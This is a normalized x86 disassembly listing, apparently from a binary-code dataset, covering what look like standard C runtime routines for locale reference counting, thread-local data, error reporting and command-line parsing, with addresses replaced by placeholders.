[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_415d62
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_416d94
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_4152db
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_4152db
pop ecx
push 0xd
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4160ac
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_4152db
pop ecx
sub_416103
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_416192
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_41622b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_4152db
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_4152db
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_4152db
push [ esi + 0xc0 ]
call sub_4152db
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_418416
push [ esi + 0xd4 ]
call sub_4152db
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_4152db
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4152db
pop ecx
push [ esi + 0xb0 ]
call sub_4152db
push [ esi + 0xbc ]
call sub_4152db
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4152db
push [ esi + 0xbc ]
call sub_4187f6
pop ecx
pop ecx
push eax
call sub_4152db
pop ecx
push eax
call sub_4152db
push [ esi + 0xbc ]
call sub_41878d
pop ecx
pop ecx
sub_416376
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_416103
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_416192
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_41622b
pop ecx
sub_4163c3
push 0xc
push r--data
call sub_415830
call sub_4165ec
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_416376
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416430
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4165ec
mov esi [ eax + 0x6c ]
mov eax esi
call sub_415875
retn
push 0x20
call sub_41580b
sub_41644e
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_416482
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_41790a
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_4164bf
push 0x8
push r--data
call sub_415830
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416561
push 0xc
call sub_417a3a
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_416103
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41656a
call sub_415875
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_416573
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_41644e
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_415471
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_4152db
pop ecx
xor esi esi
push 0x0
push esi
call sub_4164bf
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_416606
push 0x8
push r--data
call sub_415830
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_415875
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_4152db
pop ecx
push 0xd
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_4152db
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416720
push 0xc
call sub_417a3a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41672c
push esi
call sub_4152db
pop ecx
push edi
call sub_416192
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_4152db
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_41622b
pop ecx
sub_416735
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_416482
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_416445
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_415593
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_4178c0
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_416482
mov edi [ DecodePointer@IAT ]
push sub_416606
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_415471
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_4164bf
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_4168b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_4188f4
pop ecx
pop ecx
sub_4168df
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_416934
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_416d94
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_416d42
mov eax esi
jmp r-xdata
sub_4169a0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_416ac0
push 0xc
push r--data
call sub_415830
push 0xe
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416b27
call sub_415875
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_4152db
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_4152db
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_416b30
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_416bc7
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_4130d0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_418947
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_418947
pop ecx
sub_416cf0
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_416bc7
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_416d15
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416cf0
int3
pop ebp
jmp eax
sub_416d52
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_416da7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_416a2b
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_416df7
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_416e1d
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_416df7
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
push 0x3
call sub_418c7b
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_418c7b
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_418c18
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_4169a0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_416cf0
push esi
call sub_418bfd
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_418c18
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_418abb
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_418bfd
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_418b30
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_418abb
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_41894f
add esp 0xc
jmp r-xdata
sub_416fcc
push 0x3
call sub_418c7b
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_416e1d
push 0xff
call sub_416e1d
pop ecx
pop ecx
push 0x3
call sub_418c7b
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_417005
mov edi edi
push ebp
mov ebp esp
push esi
call sub_416573
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_41714f
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_4160e5
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_418d0d
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_4171ae
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_4160e5
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_415471
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_4169a0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_4169a0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_4152db
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_415471
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_4152db
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_416934
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_416cf0
int3
add edi 0x4
sub_41728a
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_418d0d
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
